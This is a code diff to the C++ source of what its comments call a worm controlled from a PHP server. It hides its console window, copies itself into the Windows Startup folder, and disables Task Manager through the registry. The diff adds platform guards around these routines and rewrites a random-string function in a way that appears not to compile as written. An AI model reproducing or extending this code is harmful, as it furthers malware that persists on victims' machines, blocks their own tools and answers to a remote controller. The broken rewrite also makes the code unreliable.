@@ -1,17 +1,21 @@
 #define CPPHTTPLIB_OPENSSL_SUPPORT
-#include <chrono>
-#include <cstdio>
 #include "External/binaryhandling.hpp"
 #include "External/httplib.h"
 #include "External/URLparse.hpp"
-#include <thread>
+#include <random>
 #include <string>
+#include <thread>
+#include <vector>
+#ifdef _WIN32
 #include <windows.h>
 #include <winreg.h>
+
 #pragma comment(lib, "user32")
+#pragma comment(lib, "advapi32")
+#endif
+
 #pragma comment(lib, "libcrypto")
 #pragma comment(lib, "libssl")
-#pragma comment(lib, "advapi32")
 
 // Replace It with the server link or IP where PHP server is running
 // The PHP files to put on server is in server directory.
@@ -72,6 +76,7 @@ std::string exec(const char* cmd) {
     return result;
 }
 
+#ifdef _WIN32
 void deact_taskmgr() {
     DWORD dwVal = 1;
 
@@ -80,10 +85,12 @@ void deact_taskmgr() {
     RegSetValueEx (hKey, L"DisableTaskmgr", 0, REG_DWORD, (LPBYTE)&dwVal , sizeof(DWORD));
     RegCloseKey(hKey);
 }
+#endif
 
 int main(int argc, char* argv[]) {
 	std::string attackFlag;
 
+#ifdef _WIN32
 	// Run process in background
 	runInBackground();
 
@@ -91,6 +98,7 @@ int main(int argc, char* argv[]) {
 	saveStartup(argv);
 
     	deact_taskmgr();
+#endif
 
 	// Life of worm begins here
 	while (1) {
@@ -126,18 +134,21 @@ int main(int argc, char* argv[]) {
 * RUN AS BACKGROUND PROCESS -> return void
 * =======================================================================================
 */
+#ifdef _WIN32
 void runInBackground() {
 	HWND window;
   	AllocConsole();
 	window = FindWindowA("ConsoleWindowClass", NULL);
 	ShowWindow(window, 0);
 }
+#endif
 
 /*
 * =======================================================================================
 * SAVE TO STARTUP FOLDER -> return void
 * =======================================================================================
 */
+#ifdef _WIN32
 void saveStartup(char* argv[]) {
     std::string path = std::string{getenv("appdata")} + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\";
     nk125::binary_file_handler b;
@@ -155,6 +166,7 @@ void saveStartup(char* argv[]) {
         return;
     }
 }
+#endif
 
 /*
 * =======================================================================================
@@ -232,18 +244,20 @@ std::string makeRequest(std::string method, std::string uri) {
 * =======================================================================================
 */
 std::string randomString(int n) {
-    using namespace std::chrono;
-    auto cptr = chrono::system_clock::now();
-    srand(chrono::duration_cast<chrono::nanoseconds>(cptr.time_since_epoch()).count());
-    char alpha[] = "abcdefghijklmnopqrstuvwxyz"
+    std::random_device rd;
+    std::mt19937 mt(rd());
+    std::vector<char> alpha = {"abcdefghijklmnopqrstuvwxyz"
                    "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
                    "0123456789"
-                   "9876543210";
+                   "9876543210"};
 
+    std::uniform_int_distribution<> uint(0, alpha.size() - 1);
+    
     std::string res;
     res.reserve(n);
+    
     for (int i = 0; i < n; i++) {
-        res = res + alpha[rand() % sizeof(alpha)];
+        res.append(alpha.at(uint(mt)));
     }
 
     return res;
